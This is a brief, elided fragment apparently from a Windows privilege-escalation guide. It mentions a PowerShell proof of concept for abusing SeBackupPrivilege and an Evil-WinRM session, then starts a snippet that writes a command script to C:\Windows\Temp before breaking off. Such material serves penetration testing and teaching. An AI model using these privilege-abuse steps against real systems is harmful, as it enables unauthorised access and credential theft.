...
PowerShell PoC that provides cmdlets for abusing `SeBackupPrivilege`.
...
Create a command sequence script in Powershell if using Evil-WinRM:
...
[System.IO.File]::WriteAllText(
    'C:\Windows\Temp\backup_script.txt',
    ($lines -join "`r`n") + "`r`n",
